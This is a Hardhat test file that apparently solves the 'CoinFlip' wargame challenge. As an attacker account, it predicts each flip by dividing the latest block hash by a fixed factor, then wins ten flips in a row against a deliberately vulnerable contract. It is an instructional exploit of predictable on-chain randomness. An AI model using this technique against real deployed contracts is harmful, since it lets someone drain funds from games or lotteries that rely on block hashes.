import { expect } from "chai";
import { ethers } from "hardhat";
import { loadFixture } from "ethereum-waffle";
import { BigNumber } from "ethers";

const FACTOR = BigNumber.from("57896044618658097711785492504343953926634992332820282019728792003956564819968");

describe("CoinFlip hack", () => {
  async function deployCoinFlipFixture() {
    const [deployer, attacker] = await ethers.getSigners();
    const CoinFlip = await ethers.getContractFactory("CoinFlip");
    const coinFlip = await CoinFlip.connect(deployer).deploy();
    return { attacker, coinFlip };
  }

  it("Should guess the correct outcome 10 times in a row", async () => {
    const { attacker, coinFlip } = await loadFixture(deployCoinFlipFixture);

    for (let i = 0; i < 10; i++) {
      const guess = await computeGuess();
      const tx = await coinFlip.connect(attacker).flip(guess);
      await tx.wait();
    }

    expect(await coinFlip.consecutiveWins()).to.be.equal("10", "Did not win consecutively");
  });
});

async function computeGuess(): Promise<boolean> {
  const latestBlockNumber = await ethers.provider.getBlockNumber();
  const blockhash = (await ethers.provider.getBlock(latestBlockNumber)).hash;
  const blockValue = BigNumber.from(blockhash);
  const coinFlip = blockValue.div(FACTOR);
  console.log(`Block : ${latestBlockNumber} ${coinFlip.eq(1)}`);
  return new Promise((resolve) => resolve(coinFlip.eq(1)));
}
